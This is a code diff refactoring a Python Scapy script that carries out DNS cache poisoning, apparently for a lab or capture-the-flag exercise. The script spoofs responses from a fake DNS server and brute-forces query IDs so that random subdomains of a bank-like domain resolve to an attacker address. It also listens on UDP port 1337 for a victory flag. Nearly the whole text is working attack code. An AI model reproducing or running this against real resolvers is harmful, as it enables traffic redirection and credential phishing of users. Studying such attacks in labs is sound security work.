@@ -45,10 +45,18 @@ SPOOFED_DNS = "10.0.0.1"
 URL_TO_POISON = "bankofallan.co.uk"
 DNS_URL_BADGUY = "badguy.ru"
 
+BADGUY_REDIRECT_IP = "192.168.56.1"
+VICTORY_FLAG_PORT = 1337
+BUFFER_SIZE = 8192
+
 NUMBER_OF_PACKETS = 500  # number of packets per attempt
 TIME_SLEEP_SECONDS = 3  # seconds of delay before attack
 
 ATTACK_GOING_ON = True
+
+
+# TARGET_PORT = 0
+# STARTING_QUERY_ID = 0
 
 
 def dns_server_routine():
@@ -65,7 +73,7 @@ def dns_server_routine():
         first_query_id = decode_dns_message(a[0].getlayer(Raw).load)["id"]
         print(DNS_ROUTINE_HEADER + "Query Id found is " + str(first_query_id))
         dns_record_request = DNSQR(qname=DNS_URL_BADGUY)
-        dns_answer = DNSRR(rrname=DNS_URL_BADGUY, type="A", ttl=60000, rclass="IN", rdata="192.168.56.1")
+        dns_answer = DNSRR(rrname=DNS_URL_BADGUY, type="A", ttl=600, rclass="IN", rdata="192.168.56.1")
         print(DNS_ROUTINE_HEADER + "Sending badguy.ru DNS response...")
         res_packet = IP(src=SPOOFED_DNS, dst=TARGET_IP) / UDP(dport=target_port) / DNS(id=first_query_id,
                                                                                        qr=1,
@@ -106,7 +114,7 @@ def bite_the_rat(target_port_sniffed, query_id):
         random_url = randomize_url(randint(1, 10)) + URL_TO_POISON
         guess_query_id = random_query_id(query_id)
         dns_record_req = DNSQR(qname=random_url, qtype="A")
-        dns_answer = DNSRR(rrname=random_url, type="A", ttl=100, rclass="IN", rdata="192.168.56.1")
+        dns_answer = DNSRR(rrname=random_url, type="A", ttl=100, rclass="IN", rdata=BADGUY_REDIRECT_IP)
         dns_malicious_req = IP(dst=TARGET_IP) / UDP(dport=53) / DNS(rd=1, qd=dns_record_req)
         attack_res_packet = IP(src=SPOOFED_DNS, dst=TARGET_IP) / UDP(sport=53, dport=target_port_sniffed) / DNS(
             id=guess_query_id,
@@ -124,11 +132,6 @@ def bite_the_rat(target_port_sniffed, query_id):
     print(BITE_THE_RAT_HEADER + "End attempt")
 
 
-UDP_IP = "192.168.56.1"
-UDP_PORT = 1337
-BUFFER_SIZE = 8192
-
-
 def flag_victory_listener():
     """
     This function listens on port 1337 the Victory flag.
@@ -137,7 +140,7 @@ def flag_victory_listener():
     sock = socket(AF_INET,  # Internet
                   SOCK_DGRAM)  # UDP
     print(LISTENER_HEADER + "Starting server...")
-    sock.bind((UDP_IP, UDP_PORT))
+    sock.bind((BADGUY_REDIRECT_IP, VICTORY_FLAG_PORT))
     print(LISTENER_HEADER + "done!")
     global ATTACK_GOING_ON
     try:
